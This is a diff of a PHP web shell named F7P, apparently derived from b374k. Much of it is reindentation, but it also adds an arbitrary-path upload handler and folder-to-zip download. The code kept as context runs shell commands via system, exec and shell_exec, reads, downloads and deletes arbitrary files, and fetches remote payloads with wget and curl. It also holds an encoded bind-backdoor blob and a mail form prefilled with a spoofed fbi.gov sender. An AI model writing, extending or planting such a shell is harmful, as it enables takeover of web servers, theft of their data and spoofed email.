@@ -15,13 +15,6 @@ if(isset($_POST['content_encoded']) && !empty($_POST['content_encoded'])) {
 @error_reporting(0);
 @set_time_limit(0);
 
-// F7P - File 7ransfer Protocol
-// core1: b374k, 2014 Aditya Kesuma
-// core2: paxi@yahoo.com
-// 70% icon by Michal Bačík
-
-// User: admin | Pass: password123
-// Use Bcrypt or https://lain.lain.ch/password-hash/
 define('ADMIN_USER', 'admin');
 define('ADMIN_PASS_HASH', '$2a$09$lF0dTQmb5Dhh2BG5DAS6NuzJ8/rOT9el9Nui2vZAZmWkkKKf4idCu');
 
@@ -98,8 +91,8 @@ if (!$is_logged_in) {
 }
 
 if(isset($_GET['dl']) && ($_GET['dl'] != "")){
-	$file = $_GET['dl'];
-	$filez = @file_get_contents($file);
+    $file = $_GET['dl'];
+    $filez = @file_get_contents($file);
    header("Content-type: application/octet-stream");
    header("Content-length: ".strlen($filez));
    header("Content-disposition: attachment; filename=\"".basename($file)."\";");
@@ -107,8 +100,8 @@ if(isset($_GET['dl']) && ($_GET['dl'] != "")){
     exit;
 }
 elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
-	$file = $_GET['dlgzip'];
-	$filez = gzencode(@file_get_contents($file));
+    $file = $_GET['dlgzip'];
+    $filez = gzencode(@file_get_contents($file));
    header("Content-Type:application/x-gzip\n");
    header("Content-length: ".strlen($filez));
    header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
@@ -123,39 +116,39 @@ if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
 else $win = FALSE;
 
 if(isset($_GET['y'])){
-	if(@is_dir($_GET['view'])){
-		$pwd = $_GET['view'];
-		@chdir($pwd);
-	}
-	else{
-		$pwd = $_GET['y'];
-		@chdir($pwd);
-	}
+    if(@is_dir($_GET['view'])){
+        $pwd = $_GET['view'];
+        @chdir($pwd);
+    }
+    else{
+        $pwd = $_GET['y'];
+        @chdir($pwd);
+    }
 }
 
 if(!$win){
-	if(!$user = rapih(exe("whoami"))) $user = "";
-	if(!$id = rapih(exe("id"))) $id = "";
-	$prompt = $user." \$ ";
-	$pwd = @getcwd().DIRECTORY_SEPARATOR;
+    if(!$user = rapih(exe("whoami"))) $user = "";
+    if(!$id = rapih(exe("id"))) $id = "";
+    $prompt = $user." \$ ";
+    $pwd = @getcwd().DIRECTORY_SEPARATOR;
 }
 else {
-	$user = @get_current_user();
-	$id = $user;
-	$prompt = $user." &gt;";
-	$pwd = realpath(".")."\\";
- 	$v = explode("\\",$d);
-	$v = $v[0];
- 	foreach (range("A","Z") as $letter)
- 	{
-	  $bool = @is_dir($letter.":\\");
-	  if ($bool)
-	  {
- 		  $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
-		   if ($letter.":" != $v) {$letters .= $letter;}
-		   else {$letters .= "<span class=\"gaya\">".$letter."</span>";}
-		   $letters .= " ]</a> ";
-  	  }
+    $user = @get_current_user();
+    $id = $user;
+    $prompt = $user." &gt;";
+    $pwd = realpath(".")."\\";
+    $v = explode("\\",$d);
+    $v = $v[0];
+    foreach (range("A","Z") as $letter)
+    {
+      $bool = @is_dir($letter.":\\");
+      if ($bool)
+      {
+          $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
+           if ($letter.":" != $v) {$letters .= $letter;}
+           else {$letters .= "<span class=\"gaya\">".$letter."</span>";}
+           $letters .= " ]</a> ";
+      }
  }
 }
 if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
@@ -171,50 +164,49 @@ $pwdurl = "";
 $breadcrumb_full = "";
 $total = sizeof($pwds)-1;
 for($i = 0 ; $i < $total ; $i++){
-	$pathz = "";
-	for($j = 0 ; $j <= $i ; $j++){
-		$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
-	}
-	if($i == $total-1){
-		$breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\" style=\"font-size:18px;font-weight:bold;color:#0066cc;\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
-	} else {
-		$breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
-	}
+    $pathz = "";
+    for($j = 0 ; $j <= $i ; $j++){
+        $pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
+    }
+    if($i == $total-1){
+        $breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\" style=\"font-size:18px;font-weight:bold;color:#0066cc;\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
+    } else {
+        $breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
+    }
 }
 
 if(isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])){
-	$old = trim($_POST['oldname']);
-	$new = trim($_POST['newname']);
-	$current_dir = isset($_POST['current_dir']) ? $_POST['current_dir'] : $pwd;
-	
-	if($old != $new && !empty($new)){
-		$old_path = $current_dir . $old;
-		$new_path = $current_dir . $new;
-		
-		if(!file_exists($new_path)){
-			if(@rename($old_path, $new_path)){
-				header("Location: ?y=".urlencode($current_dir));
-				exit;
-			}
-		}
-	}
-	header("Location: ?y=".urlencode($current_dir));
-	exit;
+    $old = trim($_POST['oldname']);
+    $new = trim($_POST['newname']);
+    $current_dir = isset($_POST['current_dir']) ? $_POST['current_dir'] : $pwd;
+    
+    if($old != $new && !empty($new)){
+        $old_path = $current_dir . $old;
+        $new_path = $current_dir . $new;
+        
+        if(!file_exists($new_path)){
+            if(@rename($old_path, $new_path)){
+                header("Location: ?y=".urlencode($current_dir));
+                exit;
+            }
+        }
+    }
+    header("Location: ?y=".urlencode($current_dir));
+    exit;
 }
 
 if(isset($_GET['delete']) && ($_GET['delete'] != "")){
-	$file = $_GET['delete'];
-	if(is_file($file)){
-		@unlink($file);
-	}
-	header("Location: ?y=".urlencode($pwd));
-	exit;
+    $file = $_GET['delete'];
+    if(is_file($file)){
+        @unlink($file);
+    }
+    header("Location: ?y=".urlencode($pwd));
+    exit;
 }
 
 if(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
     $dir = $_GET['fdelete'];
     if(is_dir($dir)){
-       
         if(deleteFolder($dir)){
            
         } else {
@@ -225,35 +217,28 @@ if(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
     exit;
 }
 if(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
-	$path = $pwd . $_GET['mkdir'];
-	if(!file_exists($path)){
-		@mkdir($path, 0755);
-	}
-	header("Location: ?y=".urlencode($pwd));
-	exit;
+    $path = $pwd . $_GET['mkdir'];
+    if(!file_exists($path)){
+        @mkdir($path, 0755);
+    }
+    header("Location: ?y=".urlencode($pwd));
+    exit;
 }
 
-
 function rapih($text){
-	return trim(str_replace("<br />","",$text));
+    return trim(str_replace("<br />","",$text));
 }
 
 function deleteFolder($dir) {
     if (!is_dir($dir)) {
         return false;
     }
-    
-   
     $files = array_diff(scandir($dir), array('.', '..'));
-    
     foreach ($files as $file) {
         $path = $dir . DIRECTORY_SEPARATOR . $file;
-        
         if (is_dir($path)) {
-           
             deleteFolder($path);
         } else {
-           
             @unlink($path);
         }
     }
@@ -261,14 +246,13 @@ function deleteFolder($dir) {
 }
 
 function magicboom($text){
-	if (!get_magic_quotes_gpc()) {
-   		 return $text;
-	}
-	return stripslashes($text);
+    if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
+        return stripslashes($text);
+    }
+    return $text;
 }
 function timeAgo($timestamp) {
     $time_ago = time() - $timestamp;
-    
     if ($time_ago < 60) {
         return $time_ago . 's';
     } elseif ($time_ago < 3600) {
@@ -292,48 +276,48 @@ function timeAgo($timestamp) {
     }
 }
 function showdir($pwd,$prompt){
-	global $user, $win, $posix;
-	$fname = array();
-	$dname = array();
-	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
-	else $posix = FALSE;
-	$user = "????:????";
-	if($dh = @scandir($pwd)){
-		foreach($dh as $file){
-			if($file == '.' || $file == '..') continue;
-			if(is_dir($file)){
-				$dname[] = $file;
-			}
-			elseif(is_file($file)){
-				$fname[] = $file;
-			}
-		}
-	}
-	else{
-		if($dh = @opendir($pwd)){
-			while($file = @readdir($dh)){
-				if($file == '.' || $file == '..') continue;
-				if(@is_dir($file)){
-					$dname[] = $file;
-				}
-				elseif(@is_file($file)){
-					$fname[] = $file;
-				}
-			}
-			@closedir($dh);
-		}
-	}
+    global $user, $win, $posix;
+    $fname = array();
+    $dname = array();
+    if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
+    else $posix = FALSE;
+    $user = "????:????";
+    if($dh = @scandir($pwd)){
+        foreach($dh as $file){
+            if($file == '.' || $file == '..') continue;
+            if(is_dir($file)){
+                $dname[] = $file;
+            }
+            elseif(is_file($file)){
+                $fname[] = $file;
+            }
+        }
+    }
+    else{
+        if($dh = @opendir($pwd)){
+            while($file = @readdir($dh)){
+                if($file == '.' || $file == '..') continue;
+                if(@is_dir($file)){
+                    $dname[] = $file;
+                }
+                elseif(@is_file($file)){
+                    $fname[] = $file;
+                }
+            }
+            @closedir($dh);
+        }
+    }
 
-	sort($fname);
-	sort($dname);
-	$path = @explode(DIRECTORY_SEPARATOR,$pwd);
-	$tree = @sizeof($path);
-	$parent = "";
-	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
-	else $parent = $pwd;
+    sort($fname);
+    sort($dname);
+    $path = @explode(DIRECTORY_SEPARATOR,$pwd);
+    $tree = @sizeof($path);
+    $parent = "";
+    if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
+    else $parent = $pwd;
 
-	$buff = "<div class='table-wrap'><table class=\"explore\">";
-	$buff .= "<tbody>";
+    $buff = "<div class='table-wrap'><table class=\"explore\">";
+    $buff .= "<tbody>";
 
 $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".$parent."'\">
     <td class=\"file-name\"><span class=\"folder-icon\"><img width=24px src=f7p-assets/up.png></span> ..</td>
@@ -347,11 +331,10 @@ $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.lo
     </td>
 </tr>";
 
-	foreach($dname as $folder){
+    foreach($dname as $folder){
     $full_folder = $pwd.$folder;
     $safe_id = 'd_' . md5($folder);
-   $folder_time = date("Y-m-d H:i:s", filemtime($full_folder));
-$folder_ago = timeAgo(filemtime($full_folder));
+    $folder_ago = timeAgo(filemtime($full_folder));
 
     $buff .= "<tr style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".urlencode($pwd.$folder.DIRECTORY_SEPARATOR)."'\">
         <td class=\"file-name\">
@@ -370,11 +353,14 @@ $folder_ago = timeAgo(filemtime($full_folder));
         </td>
         <td></td>    <td style=\"font-size:12px;color:#888;\">".$folder_ago."</td>
         <td style=\"white-space:nowrap;text-align:right;\">
+            
             <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();showRenameAlert('".addslashes($folder)."', '".addslashes($full_folder)."', '".addslashes($pwd)."', 'folder');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
             <a href=\"?y=".urlencode($pwd)."&amp;fdelete=".urlencode($pwd.$folder)."\" onclick=\"event.stopPropagation();return confirmDelete('".addslashes($folder)."', 'folder');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
+<a href=\"?y=".urlencode($pwd)."&amp;dlfolder=".urlencode($pwd.$folder)."\" data-no-ajax=\"true\" title=\"Download as ZIP\"><img width=20px src=f7p-assets/download.png></a>
         </td>
     </tr>";
 }
+
 foreach($fname as $file){
     $full = $pwd.$file;
     $size = ukuran($full);
@@ -384,7 +370,7 @@ foreach($fname as $file){
     $is_image = in_array($ext, $image_exts);
     
     $edit_link = "edit=" . urlencode($full);
-    $view_link = $is_image ? "img=" . urlencode($file) : "view=" . urlencode($full);
+    $view_link = $is_image ? "img=" . urlencode($full) : "view=" . urlencode($full);
    $file_time = date("Y-m-d H:i:s", filemtime($full));
 $file_ago = timeAgo(filemtime($full));
 
@@ -412,119 +398,119 @@ $file_ago = timeAgo(filemtime($full));
     </tr>";
 }
 
-	$buff .= "</tbody></table></div>";
-	return $buff;
+    $buff .= "</tbody></table></div>";
+    return $buff;
 }
 
 function ukuran($file){
-	if($size = @filesize($file)){
-		if($size < 1024) return $size." B";
-		elseif($size < 1024*1024) {
-			$size = @round($size / 1024,1);
-			return "$size KB";
-		}
-		elseif($size < 1024*1024*1024) {
-			$size = @round($size / 1024 / 1024,2);
-			return "$size MB";
-		}
-		else {
-			$size = @round($size / 1024 / 1024 / 1024,2);
-			return "$size GB";
-		}
-	}
-	else return "???";
+    if($size = @filesize($file)){
+        if($size < 1024) return $size." B";
+        elseif($size < 1024*1024) {
+            $size = @round($size / 1024,1);
+            return "$size KB";
+        }
+        elseif($size < 1024*1024*1024) {
+            $size = @round($size / 1024 / 1024,2);
+            return "$size MB";
+        }
+        else {
+            $size = @round($size / 1024 / 1024 / 1024,2);
+            return "$size GB";
+        }
+    }
+    else return "???";
 }
 
 function exe($cmd){
-	if(function_exists('system')) {
-		@ob_start();
-		@system($cmd);
-		$buff = @ob_get_contents();
-		@ob_end_clean();
-		return $buff;
-	}
-	elseif(function_exists('exec')) {
-		@exec($cmd,$results);
-		$buff = "";
-		foreach($results as $result){
-			$buff .= $result;
-		}
-		return $buff;
-	}
-	elseif(function_exists('passthru')) {
-		@ob_start();
-		@passthru($cmd);
-		$buff = @ob_get_contents();
-		@ob_end_clean();
-		return $buff;
-	}
-	elseif(function_exists('shell_exec')){
-		$buff = @shell_exec($cmd);
-		return $buff;
-	}
+    if(function_exists('system')) {
+        @ob_start();
+        @system($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return $buff;
+    }
+    elseif(function_exists('exec')) {
+        @exec($cmd,$results);
+        $buff = "";
+        foreach($results as $result){
+            $buff .= $result;
+        }
+        return $buff;
+    }
+    elseif(function_exists('passthru')) {
+        @ob_start();
+        @passthru($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return $buff;
+    }
+    elseif(function_exists('shell_exec')){
+        $buff = @shell_exec($cmd);
+        return $buff;
+    }
 }
 
 function tulis($file,$text){
-	$textz = gzinflate(base64_decode($text));
-	 if($filez = @fopen($file,"w"))
-	 {
-		 @fputs($filez,$textz);
-		 @fclose($file);
-	 }
+    $textz = gzinflate(base64_decode($text));
+     if($filez = @fopen($file,"w"))
+     {
+         @fputs($filez,$textz);
+         @fclose($file);
+     }
 }
 
 function ambil($link,$file) {
    if($fp = @fopen($link,"r")){
-	   while(!feof($fp)) {
-   		    $cont.= @fread($fp,1024);
-   		}
-   		@fclose($fp);
-	   $fp2 = @fopen($file,"w");
-	   @fwrite($fp2,$cont);
-	   @fclose($fp2);
+       while(!feof($fp)) {
+               $cont.= @fread($fp,1024);
+           }
+           @fclose($fp);
+       $fp2 = @fopen($file,"w");
+       @fwrite($fp2,$cont);
+       @fclose($fp2);
    }
 }
 
 function which($pr){
-	$path = exe("which $pr");
-	if(!empty($path)) { return trim($path); } else { return trim($pr); }
+    $path = exe("which $pr");
+    if(!empty($path)) { return trim($path); } else { return trim($pr); }
 }
 
 function download($cmd,$url){
-	$namafile = basename($url);
-	switch($cmd) {
-		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
-		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
-		case 'wfread' : ambil($wurl,$namafile);break;
-		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
-		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
-		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
-		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
-		default: break;
-	}
-	return $namafile;
+    $namafile = basename($url);
+    switch($cmd) {
+        case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
+        case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
+        case 'wfread' : ambil($wurl,$namafile);break;
+        case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
+        case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
+        case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
+        case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
+        default: break;
+    }
+    return $namafile;
 }
 
 function get_perms($file)
 {
-	if($mode=@fileperms($file)){
-		$perms='';
-		$perms .= ($mode & 00400) ? 'r' : '-';
-		$perms .= ($mode & 00200) ? 'w' : '-';
-		$perms .= ($mode & 00100) ? 'x' : '-';
-		$perms .= ($mode & 00040) ? 'r' : '-';
-		$perms .= ($mode & 00020) ? 'w' : '-';
-		$perms .= ($mode & 00010) ? 'x' : '-';
-		$perms .= ($mode & 00004) ? 'r' : '-';
-		$perms .= ($mode & 00002) ? 'w' : '-';
-		$perms .= ($mode & 00001) ? 'x' : '-';
-		return $perms;
-	}
-	else return "??????????";
+    if($mode=@fileperms($file)){
+        $perms='';
+        $perms .= ($mode & 00400) ? 'r' : '-';
+        $perms .= ($mode & 00200) ? 'w' : '-';
+        $perms .= ($mode & 00100) ? 'x' : '-';
+        $perms .= ($mode & 00040) ? 'r' : '-';
+        $perms .= ($mode & 00020) ? 'w' : '-';
+        $perms .= ($mode & 00010) ? 'x' : '-';
+        $perms .= ($mode & 00004) ? 'r' : '-';
+        $perms .= ($mode & 00002) ? 'w' : '-';
+        $perms .= ($mode & 00001) ? 'x' : '-';
+        return $perms;
+    }
+    else return "??????????";
 }
 
 function clearspace($text){
-	return str_replace(array(" ","/","\\",".","-","(",")","[","]"), "_", $text);
+    return str_replace(array(" ","/","\\",".","-","(",")","[","]"), "_", $text);
 }
 
 if(isset($_GET['img_direct']) && ($_GET['img_direct'] != "")){
@@ -556,6 +542,97 @@ if(isset($_GET['img_direct']) && ($_GET['img_direct'] != "")){
     exit;
 }
 
+if(isset($_GET['x']) && $_GET['x'] == 'upload_ajax'){
+    $response = ['success' => false, 'message' => 'Unknown error'];
+    if (!isset($_SESSION['f7p_logged_in']) || $_SESSION['f7p_logged_in'] !== true) {
+        $response['message'] = 'Not logged in';
+        header('Content-Type: application/json');
+        echo json_encode($response);
+        exit;
+    }
+    if (!isset($_FILES['file_upload']) || $_FILES['file_upload']['error'] !== UPLOAD_ERR_OK) {
+        $response['message'] = 'No file uploaded';
+        header('Content-Type: application/json');
+        echo json_encode($response);
+        exit;
+    }
+    $file = $_FILES['file_upload'];
+    $file_path = isset($_POST['file_path']) ? $_POST['file_path'] : '';
+    if (empty($file_path)) {
+        $response['message'] = 'No file path specified';
+        header('Content-Type: application/json');
+        echo json_encode($response);
+        exit;
+    }
+    $content = file_get_contents($file['tmp_name']);
+    if (file_put_contents($file_path, $content) !== false) {
+        $response['success'] = true;
+        $response['message'] = 'File saved successfully';
+        $response['path'] = $file_path;
+        $response['size'] = strlen($content);
+    } else {
+        $response['message'] = 'Failed to write file';
+    }
+    header('Content-Type: application/json');
+    echo json_encode($response);
+    exit;
+}
+
+function zipFolder($source, $destination) {
+    if (!extension_loaded('zip')) {
+        return false;
+    }
+    
+    $zip = new ZipArchive();
+    if (!$zip->open($destination, ZipArchive::CREATE)) {
+        return false;
+    }
+    
+    $source = str_replace('\\', '/', realpath($source));
+    
+    if (is_dir($source) === true) {
+        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
+        
+        foreach ($files as $file) {
+            $file = str_replace('\\', '/', $file);
+            
+            if (in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) {
+                continue;
+            }
+            
+            $file = realpath($file);
+            
+            if (is_dir($file) === true) {
+                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
+            } else if (is_file($file) === true) {
+                $zip->addFile($file, str_replace($source . '/', '', $file));
+            }
+        }
+    } else if (is_file($source) === true) {
+        $zip->addFile($source, basename($source));
+    }
+    
+    return $zip->close();
+}
+if(isset($_GET['dlfolder']) && ($_GET['dlfolder'] != "")){
+    $folder = $_GET['dlfolder'];
+    if(is_dir($folder)){
+        $temp_zip = sys_get_temp_dir() . '/folder_' . md5($folder . time()) . '.zip';
+        
+        if(zipFolder($folder, $temp_zip)){
+            header('Content-Type: application/zip');
+            header('Content-Disposition: attachment; filename="' . basename($folder) . '.zip"');
+            header('Content-Length: ' . filesize($temp_zip));
+            readfile($temp_zip);
+            unlink($temp_zip);
+            exit;
+        } else {
+            echo "Failed to create zip";
+            exit;
+        }
+    }
+    exit;
+}
 $port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
 +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
 P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
@@ -824,9 +901,18 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
     ?>
         <form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
             <textarea class="output" name="mail_content" style="height:250px;">Hey there, please patch me ASAP ;-p</textarea>
-            <div class="cmd-row mt-2"><input class="inputz" style="flex:2;" type="text" value="admin@example.com" name="mail_to" /><span style="font-size:12px;color:#666;flex:1;">to</span></div>
-            <div class="cmd-row"><input class="inputz" style="flex:2;" type="text" value="F7P@fbi.gov" name="mail_from" /><span style="font-size:12px;color:#666;flex:1;">from</span></div>
-            <div class="cmd-row"><input class="inputz" style="flex:2;" type="text" value="patch me" name="mail_subject" /><span style="font-size:12px;color:#666;flex:1;">subject</span></div>
+            <div style="display:flex;align-items:center;gap:8px;margin:4px 0;">
+    <span style="font-size:13px;color:#666;width:70px;flex-shrink:0;">To:</span>
+    <input class="inputz" style="flex:1;" type="text" value="admin@example.com" name="mail_to" />
+</div>
+<div style="display:flex;align-items:center;gap:8px;margin:4px 0;">
+    <span style="font-size:13px;color:#666;width:70px;flex-shrink:0;">From:</span>
+    <input class="inputz" style="flex:1;" type="text" value="f7p@fbi.gov" name="mail_from" />
+</div>
+<div style="display:flex;align-items:center;gap:8px;margin:4px 0;">
+    <span style="font-size:13px;color:#666;width:70px;flex-shrink:0;">Subject:</span>
+    <input class="inputz" style="flex:1;" type="text" value="patch me" name="mail_subject" />
+</div>
             <div class="cmd-row mt-2"><input class="inputzbut" style="width:100%;" type="submit" value="Send" name="mail_send" /></div>
             <div style="text-align:center;margin:4px;font-size:14px;"><?php echo $msg; ?></div>
         </form>
@@ -842,108 +928,109 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
         echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
     }
     elseif(isset($_GET['img']) && ($_GET['img'] != "")){
-        $file = magicboom($_GET['img']);
+    $file = magicboom($_GET['img']);
+    
+    if(is_file($file)){
+        $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+        $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
         
-        if(is_file($file)){
-            $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-            $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
-            
-            if(in_array($file_extension, $image_extensions)){
-                $size = ukuran($file);
-                $perms = get_perms($file);
-                $filn = basename($file);
-                
-                echo "<div style='margin:4px 0;font-size:13px;color:#666;'>".htmlspecialchars($file)."</div>";
-                echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;'>";
-                echo "<span>Size: $size</span>";
-                echo "<span>Perms: $perms</span>";
-                echo "</div>";
-                echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;'>";
-                echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\">Delete</a>";
-                echo "<a href=\"?y=$pwd&amp;dl=$file\">Download</a>";
-                echo "<a href=\"?y=$pwd&amp;dlgzip=$file\">.gz</a>";
-                echo "</div>";
-                
-                echo "<div style='text-align:center;background:#fff;padding:20px;border-radius:6px;border:1px solid #eee;'>";
-                echo "<img src='?img_direct=" . urlencode($file) . "' style='max-width:100%;max-height:80vh;' />";
-                echo "</div>";
-            } else {
-                echo "<div style='padding:20px;color:#cc3333;'>File bukan gambar</div>";
-            }
-        } else {
-            echo "<div style='padding:20px;color:#cc3333;'>File tidak ditemukan</div>";
-        }
-    }
-    elseif(isset($_GET['view']) && ($_GET['view'] != "")){
-        if(is_file($_GET['view'])){
-            $file = magicboom($_GET['view']);
-            $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-            $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
-            
-            if(in_array($file_extension, $image_extensions)){
-                header("Location: ?y=" . urlencode($pwd) . "&img=" . urlencode($file));
-                exit;
-            }
-            
-            if(!$win && $posix){
-                $name = @posix_getpwuid(@fileowner($file));
-                $group = @posix_getgrgid(@filegroup($file));
-                $owner = $name['name'] . " : " . $group['name'];
-            } else {
-                $owner = $user;
-            }
-            
+        if(in_array($file_extension, $image_extensions)){
+            $size = ukuran($file);
+            $perms = get_perms($file);
             $filn = basename($file);
-            echo "<div style='margin:4px 0;font-size:13px;color:#666;'>".htmlspecialchars($file)."</div>";
-            echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;'>";
-            echo "<span>Size: " . ukuran($file) . "</span>";
-            echo "<span>Perms: " . get_perms($file) . "</span>";
-            echo "<span>Owner: " . $owner . "</span>";
+            
+            echo "<div style='margin:4px 0;text-align:center;font-size:16px;font-weight:bold;color:#0066cc;'>" . htmlspecialchars(basename($file)) . "</div>";
+            echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;justify-content:center;'>";
+            echo "<span>Size: $size</span>";
+            echo "<span>Perms: $perms</span>";
             echo "</div>";
-            echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;'>";
-            echo "<a href=\"?y=$pwd&amp;edit=$file\">Edit</a>";
-            echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\">Delete</a>";
-            echo "<a href=\"?y=$pwd&amp;dl=$file\">Download</a>";
-            echo "<a href=\"?y=$pwd&amp;dlgzip=$file\">.gz</a>";
-            echo "<a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\">Code</a>";
+            echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;justify-content:center;'>";
+            echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\" data-no-ajax=\"true\">Delete</a>";
+            echo "<a href=\"?y=$pwd&amp;dl=$file\" data-no-ajax=\"true\">Download</a>";
+            echo "<a href=\"?y=$pwd&amp;dlgzip=$file\" data-no-ajax=\"true\">.gz</a>";
             echo "</div>";
             
-            if(isset($_GET['type']) && ($_GET['type'] == 'code')){
-                echo "<div class=\"viewfile\">";
-                $file_content = @file_get_contents($file);
-                if($file_content !== false) {
-                    @highlight_string($file_content);
-                } else {
-                    echo "Cannot read file";
-                }
-                echo "</div>";
-            } else {
-                echo "<div class=\"viewfile\">";
-                $content = @file_get_contents($file);
-                if($content !== false) {
-                    echo nl2br(htmlentities($content, ENT_QUOTES, 'UTF-8'));
-                } else {
-                    echo "Cannot read file";
-                }
-                echo "</div>";
-            }
+            echo "<div style='text-align:center;background:#fff;padding:20px;border-radius:6px;border:1px solid #eee;'>";
+            echo "<img src='?img_direct=" . urlencode($file) . "' style='max-width:100%;max-height:80vh;' />";
+            echo "</div>";
+        } else {
+            echo "<div style='padding:20px;color:#cc3333;text-align:center;'>File bukan gambar</div>";
         }
-        elseif(is_dir($_GET['view'])){
-            echo showdir($pwd, $prompt);
-        }
+    } else {
+        echo "<div style='padding:20px;color:#cc3333;text-align:center;'>File tidak ditemukan</div>";
     }
+}
+    elseif(isset($_GET['view']) && ($_GET['view'] != "")){
+    $file = magicboom($_GET['view']);
+    
+    if(is_file($file)){
+        $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+        $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
+        
+        if(in_array($file_extension, $image_extensions)){
+            header("Location: ?y=" . urlencode($pwd) . "&img=" . urlencode($file));
+            exit;
+        }
+        
+        if(!$win && $posix){
+            $name = @posix_getpwuid(@fileowner($file));
+            $group = @posix_getgrgid(@filegroup($file));
+            $owner = $name['name'] . " : " . $group['name'];
+        } else {
+            $owner = $user;
+        }
+        
+        $filn = basename($file);
+        $file_size = ukuran($file);
+        $file_perms = get_perms($file);
+        
+        echo "<div style='margin:4px 0;text-align:center;font-size:16px;font-weight:bold;color:#0066cc;'>" . htmlspecialchars(basename($file)) . "</div>";
+echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;justify-content:center;'>";
+echo "<span>Size: $file_size</span>";
+echo "<span>Perms: $file_perms</span>";
+echo "<span>Owner: $owner</span>";
+echo "</div>";
